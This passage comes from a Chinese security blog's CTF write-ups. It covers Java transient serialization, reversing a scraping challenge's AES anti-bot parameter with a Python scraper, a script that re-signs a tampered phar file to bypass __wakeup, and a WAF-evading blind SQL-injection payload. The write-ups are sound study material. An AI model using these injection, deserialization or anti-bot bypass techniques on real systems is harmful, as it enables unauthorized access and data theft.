class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, height=&#x27;&quot;</span> + <span class="built_in">this</span>.height + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="2-transient关键字的作用"><a href="#2-transient关键字的作用" class="headerlink" title="2.transient关键字的作用"></a>2.transient关键字的作用</h2><p>在java中，transient主要用来防止成员变量被反序列化。<br>使用语法如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@transient</span></span><br><span class="line"><span class="keyword">private</span> String var1;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String var2;</span><br></pre></td></tr></table></figure><br><code>@transient</code>用于hibernate entity class中，使用后就会忽略掉这个字段不会让这些变量写入数据库中</p>
<h2 id="3-让transient变量进入反序列化"><a href="#3-让transient变量进入反序列化" class="headerlink" title="3.让transient变量进入反序列化"></a>3.让transient变量进入反序列化</h2><p>用下面的代码来解释一下readObject和writeObject方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String firstName;</span><br><span class="line">  <span class="keyword">private</span> String lastName;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> accountNumber;</span><br><span class="line">  <span class="keyword">private</span> Date dateOpened;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String firstName, String lastName, <span class="type">int</span> accountNumber, Date dateOpened)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;</span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.accountNumber = accountNumber;</span><br><span class="line">    <span class="built_in">this</span>.dateOpened = dateOpened;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//Setters and Getters</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream aInputStream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span><br><span class="line">  &#123;   </span><br><span class="line">    firstName = aInputStream.readUTF();</span><br><span class="line">    lastName = aInputStream.readUTF();</span><br><span class="line">    accountNumber = aInputStream.readInt();</span><br><span class="line">    dateOpened = <span class="keyword">new</span> <span class="title class_">Date</span>(aInputStream.readLong());</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream aOutputStream)</span> <span class="keyword">throws</span> IOException </span><br><span class="line">  &#123;</span><br><span class="line">    aOutputStream.writeUTF(firstName);</span><br><span class="line">    aOutputStream.writeUTF(lastName);</span><br><span class="line">    aOutputStream.writeInt(accountNumber);</span><br><span class="line">    aOutputStream.writeLong(dateOpened.getTime());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>writeXXX由ObjectOutputStream提供，readXXX同理<br>读取和写入的顺序必须是一样的<br>序列化的时候会调用writeXXX把其中的字段写入<br>反序列化的时候就会调用readXXX，按写入顺序读取（类型要相同）<br>writeUTF是写入字符串，Int是整数，等等<br>writeObject可以写入任意的类型<br><br></p>
<p>那么在看回最开始的题目，显而易见，只需要在testC中这个类加入writeObject，在进行序列化就可以了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testC</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String height;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testC</span><span class="params">(String name, String age, String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="built_in">this</span>.height = (String)s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> testC) &#123;</span><br><span class="line">            <span class="type">testC</span> <span class="variable">user</span> <span class="operator">=</span> (testC)obj;</span><br><span class="line">            <span class="keyword">return</span> user.getAge().equals(<span class="built_in">this</span>.age) &amp;&amp; user.getHeight().equals(<span class="built_in">this</span>.height) &amp;&amp; user.getName().equals(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="built_in">this</span>.height);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, height=&#x27;&quot;</span> + <span class="built_in">this</span>.height + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.delftstack.com/howto/java/transient-in-java/">https://www.delftstack.com/howto/java/transient-in-java/</a></p>
<p><a href="https://howtodoinjava.com/java/serialization/custom-serialization-readobject-writeobject/">https://howtodoinjava.com/java/serialization/custom-serialization-readobject-writeobject/</a></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>ctf</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>猿人学18题（jsvmp）</title>
    <url>/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/</url>
    <content><![CDATA[<p>猿人学18题链接<br><a href="https://match.yuanrenxue.com/match/18">https://match.yuanrenxue.com/match/18</a><br><span id="more"></span></p>
<ul>
<li><h3 id="1-初步分析，找到加密点"><a href="#1-初步分析，找到加密点" class="headerlink" title="1.初步分析，找到加密点"></a>1.初步分析，找到加密点</h3><blockquote>
<p>要求爬取后几个数据<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/1.png" alt><br> 当点击4，5页面时会出现<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/2.png" alt><br> 此时抓包改ua<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/3.png" alt><br> 会显示如上界面，也就是必须要破解v参数，否则会触发风控系统<br><br> 那么对ajax请求进行栈跟踪，找到加密处<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/4.png" alt><br> 进入getdata，向前面的代码打上断点#<em>也就是xml.send()的前面</em><br> <strong>因为一般来说加密过程在发送数据包的前面</strong><br><br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/5.png" alt><br> 由上图可以看出请求的page只有1，并没有v=后面的加密数据，所以推测加密算法在xml.open()后面，继续步进<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/6.png" alt><br> 可以看到这是混淆代码，所以应该就来到了加密处<font size="1" color="#0000FF">(firefox不知道为什么不能很好的格式化输出，只好用chrome了)</font><br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/7.png" alt><br> 观察传入的四个参数，可以找到有一个是上图所示，不难看出是<strong>AES加密</strong>，且填充方式是<strong>pkcs7</strong><br><br> 那么就可以通过这点进行hook，观察加密参数是什么<br> 保持断点不动，切到console<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/8.png" alt><br> 当输入<code>_[1][0]</code>时可以看到加密相关的参数，我们需要的就是覆盖掉加密函数，这样就能保证每次他进行加密的时候可以知道加密了哪些参数</p>
</blockquote>
</li>
<li><h3 id="2-hook-AES加密，分析加密数据"><a href="#2-hook-AES加密，分析加密数据" class="headerlink" title="2.hook AES加密，分析加密数据"></a>2.hook AES加密，分析加密数据</h3><blockquote>
<p>继续上一步，到console，当我想定义变量的时候，出现以下错误<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/9.png" alt><br> 不知道是什么原因，思考良久以后发现只要在进入混淆代码之前就把变量定义出来就行，如下图<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/10.png" alt><br> 在这时候切到console界面，然后定义变量，到时候就用这个变量<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/11.png" alt><br> 回到调试器，继续步进，回到混淆代码处</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">org_encrypto = _[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>][<span class="string">&#x27;AES&#x27;</span>].<span class="property">encrypt</span>;</span><br><span class="line"></span><br><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>][<span class="string">&#x27;AES&#x27;</span>].<span class="property">encrypt</span> = <span class="keyword">function</span>(<span class="params">a,b,c,d,e</span>)&#123;</span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">org_encrypto</span>(a,b,c,d,e);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(org_encrypto.<span class="title function_">toString</span>());</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/12.png" alt><br> 然后在控制台输入以上代码，进行hook操作<br> 接下来直接继续脚本执行<font size="1"><em>不用f11什么的步进</em></font><br> 当他进行加密操作的时候，会自动跳转到刚刚覆盖的函数encrypt<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/14.png" alt><br> 这时候就可以看到具体加密了什么参数了，到控制台输出一下<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/13.png" alt></p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>].<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(a) <span class="comment">//text</span></span><br><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>].<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(b) <span class="comment">//key</span></span><br><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>].<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(c.<span class="property">iv</span>) <span class="comment">//iv</span></span><br></pre></td></tr></table></figure>
<p>那么接下来就是分析这些参数具体是怎么生成的了<br> 在调用栈里面回到上一个调用函数<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/15.png" alt><br> 那么在此添加日志断点，可以输出所有经过此函数的变量<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/16.png" alt><br> 这时候把其它断点都去掉，页面刷新一下把hook的函数也去掉，只留下日志断点<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/17.png" alt><br> 可以看到当鼠标移动的时候会在控制台输出以上信息，这时候点击第二页（第三页也行都一样）<br> 可以看到控制台输出了很多其它信息，往上翻找，找到第一次变化的地方<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/18.png" alt><br> <code>1654762249</code>第一个数据，很明显是时间戳<br> 后面跟了一个16，猜测是把时间戳进行16进制转换<br> 用计算器算了一下确实如此，结果为<code>62a1ab09</code>，然后再把结果进行拼接，变为了<code>62a1ab0962a1ab09</code><br> 而另一个数据就是把6个鼠标移动位置进行了拼接，然后前面2|就是当前页码，最后变为<code>2|704m205,702m205,701m205,701d205,701m205,701u205</code><br><br> 那么最后结果就一目了然了，text就是鼠标移动加页面的拼接，另外两个就是iv和key，在这里iv=key<br> 往下翻找到加密后的数据（当然在network那栏也可以找到）也就是v=<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/19.png" alt><br> 用上面的数据进行加密，看看结果是否符合<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/20.png" alt><br> 显然是符合的，有些不一样是因为被url编码了，那么具体加密也了解了，现在开始写python脚本了</p>
</blockquote>
</li>
<li><h3 id="3-脚本实现"><a href="#3-脚本实现" class="headerlink" title="3.脚本实现"></a>3.脚本实现</h3><blockquote>
<p>首先需要获取当前时间戳，并将其转换为16进制，再进行拼接</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AESKEY = <span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)+<span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">AESIV = AESKEY</span><br></pre></td></tr></table></figure>
<p>然后是对鼠标位置的拼接，这里直接将上面的鼠标键位复制下来，后与第四页进行拼接<br> <code>text = &#39;4|704m205,702m205,701m205,701d205,701m205,701u205&#39;</code><br>然后在用AES加密</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">AESKEY = <span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)+<span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">AESIV = AESKEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESTool</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    self.key = AESKEY.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    self.iv = AESIV.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcs7padding</span>(<span class="params">self, text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    明文使用PKCS7填充</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    bs = <span class="number">16</span></span><br><span class="line">    length = <span class="built_in">len</span>(text)</span><br><span class="line">    bytes_length = <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    padding_size = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">    padding = bs - padding_size % bs</span><br><span class="line">    padding_text = <span class="built_in">chr</span>(padding) * padding</span><br><span class="line">    self.coding = <span class="built_in">chr</span>(padding)</span><br><span class="line">    <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    AES加密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">    <span class="comment"># 处理明文</span></span><br><span class="line">    content_padding = self.pkcs7padding(content)</span><br><span class="line">    <span class="comment"># 加密</span></span><br><span class="line">    encrypt_bytes = cipher.encrypt(content_padding.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># 重新编码</span></span><br><span class="line">    result = <span class="built_in">str</span>(base64.b64encode(encrypt_bytes), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    AES解密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">    content = base64.b64decode(content)</span><br><span class="line">    text = cipher.decrypt(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> self.pkcs7padding(text)</span><br><span class="line">text = <span class="string">&#x27;2|704m205,702m205,701m205,701d205,701m205,701u205&#x27;</span></span><br><span class="line">v = aes_tool.aes_encrypt(text)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://match.yuanrenxue.com/match/18data?page=2&amp;t=&#123;&#125;&amp;v=&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;yuanrenxue.project&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url.<span class="built_in">format</span>(timestamp,v),data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>由于我没有帐号，所以没有session_id，所以无法获取后两页，但是前两页是可以用python获取的，所以逻辑应该是没有问题的<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/21.png" alt></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>js逆向</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>phar signature</title>
    <url>/2022/07/06/phar-signature/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p><em>脚本在最后</em></p>
<p>如果需要手动修改phar中的内容，直接修改，然后上传，php解析会报错<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EzTrick</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$waf</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">EzTrick</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>比如如上代码<br>生成以后用hex editor打开<br><img src="/2022/07/06/phar-signature/1.jpg" alt><br>可以看到如上信息，如果我们去修改他的成员数，2改成3，去绕过__wakeup()，然后去上传<br><img src="/2022/07/06/phar-signature/2.jpg" alt><br>可以看到报错了，说是signature出错<br>那么这时候就要去了解phar文件中signature的形成了</p>
<h2 id="2-phar结构"><a href="#2-phar结构" class="headerlink" title="2.phar结构"></a>2.phar结构</h2><p><a href="https://www.php.net/manual/en/phar.fileformat.signature.php">https://www.php.net/manual/en/phar.fileformat.signature.php</a><br>官网有解释<br><img src="/2022/07/06/phar-signature/3.jpg" alt><br>大致意思就是signature是在文件内容的后端</p>
<p><a href="https://stackoverflow.com/questions/23592827/how-phar-signature-prevents-tampering-with-files">https://stackoverflow.com/questions/23592827/how-phar-signature-prevents-tampering-with-files</a><br>stackoverflow上面也有解释<br><img src="/2022/07/06/phar-signature/6.jpg" alt><br>那么意思就是用整个文件内容去进行加密<br>且默认是用sha1去加密，不过php8是默认用sha256加密</p>
<h2 id="3-生成signature"><a href="#3-生成signature" class="headerlink" title="3.生成signature"></a>3.生成signature</h2><p>那我们可以用php输出signature在比对一下十六进制文件，就可以知道具体位置了<br>在如上php代码末尾加上一段<code>var_dump($phar-&gt;getSignature());</code><br><img src="/2022/07/06/phar-signature/4.jpg" alt><br>在对比hex editor打开的<br><img src="/2022/07/06/phar-signature/5.jpg" alt><br>可以发现是在text后面32位，就是sha1加密<br>那么是用整个文件内容去加密，那应该就是用加密字符的前面内容去加密，我们可以用python去验证一下<br><img src="/2022/07/06/phar-signature/7.jpg" alt><br>可以看到与hash一样，那么我们可以写脚本，把修改以后的sha1替换了<br>由于后面的位数是一样的，那么脚本可以从后往前进行读取<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">new_sha1 = hashlib.sha1(c[:-<span class="number">28</span>]).digest() <span class="comment">#获取新的sha1</span></span><br><span class="line"></span><br><span class="line">new = c[:-<span class="number">28</span>]+hashlib.sha1(c[:-<span class="number">28</span>]).digest()+c[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar_t.phar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(new)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><br>sha1的加密脚本就可以这么实现<br><img src="/2022/07/06/phar-signature/8.jpg" alt><br>可以看到成功读取了</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛初赛sql注入</title>
    <url>/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>最近在疯狂恶补sql注入的知识，了解到国赛初赛有一道sql注入的题目，就去看了一下<br><span id="more"></span></p>
<h2 id="2-分析过滤"><a href="#2-分析过滤" class="headerlink" title="2.分析过滤"></a>2.分析过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s,()#;*~\-]/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^.*(?=union|binary|regexp|rlike).*$/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$r</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable">$r</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是waf代码</p>
<ul>
<li>可以看到过滤了双括号，空格(\s),注释符号(/**/,#)</li>
<li>过滤了union 就不能进行联合查询</li>
<li>根据提示utf8mb4_bin是要进行大小写区分的</li>
</ul>
<h2 id="3-语句分析"><a href="#3-语句分析" class="headerlink" title="3.语句分析"></a>3.语句分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;||case&#x27;1&#x27;when`password`collate&#x27;utf8mb4_bin&#x27;like&#x27;&#123;&#125;%&#x27;then+9223372036854775807+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li><h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><p>如果按正常的语句，一般是用if(condition,1,0)进行判断，但是这里过滤了()，那么就不能正常使用了，同理也不能用时间盲注去进行判断了，因为使用函数都需要用括号。<br>那么这里使用的是</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case case_value</span><br><span class="line">    when condition then statement</span><br><span class="line">    when condition then statement</span><br><span class="line">    else statement</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="utf8mb4-bin"><a href="#utf8mb4-bin" class="headerlink" title="utf8mb4_bin"></a>utf8mb4_bin</h4><p>主要用于编码，让mysql可以支持4位的utf8编码，让字符变为二进制，然后开始对比。<br>一般配合collate进行使用，例如<br><code>select * from users where username collate utf8mb4_bin=&#39;admin&#39;</code><br>就会将列名username下的值和字符admin转为utf8mb4_bin进行对比</p>
</li>
